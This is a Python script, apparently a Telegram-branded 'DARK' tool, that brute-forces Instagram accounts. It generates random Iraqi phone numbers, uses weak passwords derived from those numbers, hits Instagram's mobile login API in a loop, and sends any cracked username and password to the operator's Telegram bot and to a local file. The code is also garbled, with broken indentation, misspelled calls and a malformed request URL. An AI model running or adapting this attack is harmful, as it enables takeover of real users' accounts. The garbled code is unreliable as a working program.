
import os, os
from time import sleep
os.system('title  #TTH Was Here - @DARK')
clear = lambda : os.system('cls')
try:
    import requests
except ImportError:
    os.system('pip install requests')
    import requests
    clear()

try:
    from colored import fg
except ImportError:
    os.system('pip install colored')
    from colored import fg
    clear()

try:
    from uuid import uuid4
except ImportError:
    os.system('pip install uuid')
    from uuid import uuid4
    clear()
else:
    try:
        import random
    except ImportError:
        os.system('pip install random')
        import random
        clear()
    else:
        color3 = fg(2)
        color4 = fg('9')

        def close():
            input('- Press Enter To Exit /')
            sys.exit()


        clear()
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')

        os.system('clear')
        from time import sleep
        import webbrowser, os, sys, requests
        webbrowser.open('https://t.me/@i4m_Em4D')
        Z = '\x1b[1;31m'
        P = '\x1b[2;35m'
        J = '\x1b[1;31m'
        I = '\x1b[2;36m'
        G = '\x1b[1;32m'
        H = '\x1b[2;35m'
        S = '\x1b[2;32m'
        A = '\x1b[2;36m'
        webbrowser.open('https://t.me/@i4m_Em4D')
        import user_agent, random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        import, webbrowser
        sleep(1)
        sleep(1)
        os.system('clear')
       os.system("figlet DARK")
        aa = 0
        zz = 0
        print('\n')
         
        ID = input('✓ ID telegram : ')
        sleep(1)
        tok = input('✓ TOKEN bot Telegram : ')
        start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=✰︎ Bxerbet bo toole DARK👨\u200d💻 ✰︎").json()
        id_msg = start_msg['result']['message_id']
          
            r = requests.Session()
            user = '0987654321'
            while True:
                us = str(''.join((random.choice(user) for i in range(6))))
                username = '+964750' + us
                password = '0750' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',  'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid,  'password':password,  'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id= GOOD  INSTAGRAM✅\n ====================/n✅emil : {username} \n-  ✅Pass : {password}\n====================\n BY DARK :-"
                    i = requests.post(tlg)
                    with open('INsTA V2.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(+'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= ✰︎ Welcome 𝑻𝑻𝑯 👨\u200d💻 ✰︎\n-----------------------------------------\n.✥. GOOD 💯 : {zz}\n\n.✥. BAD❌ : {aa}\n-----------------------------------------\n.✥. STERT CHECK 🔥 : {aa}\n-----------------------------------------\n.✥. E𝗆𝖺𝗂𝗅 📧 :  [→{username}←]\n.✥. Pass 📧 :  [→{password}←]\n-----------------------------------------\n .✥. BY :@HAMAYAXIM1 ")
                    print(Z + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

                    
